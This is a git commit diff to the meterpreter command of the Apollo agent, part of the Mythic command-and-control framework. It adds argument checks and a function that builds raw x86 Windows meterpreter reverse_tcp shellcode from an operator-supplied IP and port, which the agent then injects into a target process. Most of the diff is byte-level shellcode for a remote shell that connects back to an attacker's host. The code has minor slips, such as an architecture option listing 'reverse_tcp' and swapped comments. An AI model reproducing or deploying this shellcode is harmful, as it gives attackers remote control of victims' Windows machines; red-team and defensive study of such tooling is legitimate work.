32df78853a0859683ccc577aee9895fce0ba69fe
Brandon <reznok@gmail.com>
2020-11-18 02:02:43 -0800

    Add x86 reverse_tcp

--- Payload_Type/Apollo/mythic/agent_functions/meterpreter.py
+++ Payload_Type/Apollo/mythic/agent_functions/meterpreter.py
@@ -5,11 +5,15 @@ from MythicFileRPC import *
 
 class MeterpreterArguments(TaskArguments):
 
+    VALID_ARCHITECTURES = ["x64", "x86"]
+    VALID_PAYLOAD_TYPES = ["reverse_tcp", "reverse_http", "reverse_https"]
+
     def __init__(self, command_line):
         super().__init__(command_line)
         self.args = {
             "pid": CommandParameter(name="PID", type=ParameterType.Number),
             "payload_type": CommandParameter(name="Payload Type", type=ParameterType.ChooseOne, choices=["reverse_tcp"]),
+            "arch": CommandParameter(name="Architecture (x86/x64)", type=ParameterType.ChooseOne, choices=["reverse_tcp"]),
             "lhost": CommandParameter(name="LHOST", type=ParameterType.String),
             "lport": CommandParameter(name="LPORT", type=ParameterType.Number)
         }
@@ -20,7 +24,14 @@ class MeterpreterArguments(TaskArguments):
         if self.command_line[0] != "{":
             raise Exception("Require JSON blob, but got raw command line.\n\tUsage: {}".format(MeterpreterCommand.help_cmd))
         self.load_args_from_json_string(self.command_line)
-        pass
+
+        # Verify architecture type
+        if self.get_arg("arch").lower() not in self.VALID_ARCHITECTURES:
+            raise Exception("Invalid Architecture Type. Choices: x86, x64")
+
+        # Verify payload type
+        if self.get_arg("payload_type").lower() not in self.VALID_PAYLOAD_TYPES:
+            raise Exception("Invalid Architecture Type. Choices: reverse_tcp, reverse_http, reverse_https")
 
 
 class MeterpreterCommand(CommandBase):
@@ -40,12 +51,35 @@ class MeterpreterCommand(CommandBase):
     attackmapping = []
 
     async def create_tasking(self, task: MythicTask) -> MythicTask:
-        resp = await MythicFileRPC(task).register_file(build_meterpreter_reverse_tcp_64(task.args.get_arg("lhost"),
-                                                                                        task.args.get_arg("lport")))
+        resp = None
+
+
+        ###
+        # x64 Payload Generation
+        ###
+        if task.args.get_arg("arch").lower() == "x86":
+            if task.args.get_arg("payload_type").lower() == "reverse_tcp":
+                resp = await MythicFileRPC(task).register_file(
+                    build_meterpreter_reverse_tcp_86(task.args.get_arg("lhost"),
+                                                     task.args.get_arg("lport")))
+
+        ###
+        # x86 Payload Generation
+        ###
+        if task.args.get_arg("arch").lower() == "x64":
+
+            if task.args.get_arg("payload_type").lower() == "reverse_tcp":
+                resp = await MythicFileRPC(task).register_file(
+                    build_meterpreter_reverse_tcp_64(task.args.get_arg("lhost"),
+                                                     task.args.get_arg("lport")))
+
 
         # Remove args that are unused by remote agent
         task.args.remove_arg("lhost")
         task.args.remove_arg("lport")
+
+        if resp is None:
+            raise Exception("Error getting MythicRileRPC response")
 
         if resp.status == MythicStatus.Success:
             task.args.add_arg("shellcode", resp.agent_file_id)
@@ -59,6 +93,10 @@ class MeterpreterCommand(CommandBase):
 
 
 def build_meterpreter_reverse_tcp_64(IP, port):
+    """
+    Generate shellcode for windows/x64/meterpreter/reverse_tcp
+
+    """
     hex_ip = bytearray.fromhex(("".join(format(int(octet), "02x") for octet in IP.split("."))))
     hex_port = port.to_bytes(2, 'big')
 
@@ -109,5 +147,49 @@ def build_meterpreter_reverse_tcp_64(IP, port):
     buf += b"\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4"
     buf += b"\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2"
     buf += b"\x56\xff\xd5"
+
+    return buf
+
+
+def build_meterpreter_reverse_tcp_86(IP, port):
+    """
+    Generate shellcode for windows/meterpreter/reverse_tcp
+
+    """
+    hex_ip = bytearray.fromhex(("".join(format(int(octet), "02x") for octet in IP.split("."))))
+    hex_port = port.to_bytes(2, 'big')
+
+    buf = b""
+    buf += b"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b"
+    buf += b"\x52\x30\x8b\x52\x0c\x8b\x52\x14\x31\xff\x0f\xb7\x4a"
+    buf += b"\x26\x8b\x72\x28\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20"
+    buf += b"\xc1\xcf\x0d\x01\xc7\x49\x75\xef\x52\x8b\x52\x10\x57"
+    buf += b"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01"
+    buf += b"\xd0\x8b\x58\x20\x50\x01\xd3\x8b\x48\x18\x85\xc9\x74"
+    buf += b"\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xc1\xcf"
+    buf += b"\x0d\xac\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d"
+    buf += b"\x24\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b"
+    buf += b"\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
+    buf += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b"
+    buf += b"\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00\x00\x68"
+    buf += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8\xff"
+    buf += b"\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80"
+    buf += b"\x6b\x00\xff\xd5\x6a\x0a\x68"
+    buf += hex_ip
+    buf += b"\x68\x02\x00"
+    buf += hex_port
+    buf += b"\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50"
+    buf += b"\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68"
+    buf += b"\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08"
+    buf += b"\x75\xec\xe8\x67\x00\x00\x00\x6a\x00\x6a\x04\x56\x57"
+    buf += b"\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x36\x8b"
+    buf += b"\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58"
+    buf += b"\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68"
+    buf += b"\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68"
+    buf += b"\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff"
+    buf += b"\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c"
+    buf += b"\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01"
+    buf += b"\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00"
+    buf += b"\x53\xff\xd5"
 
     return buf
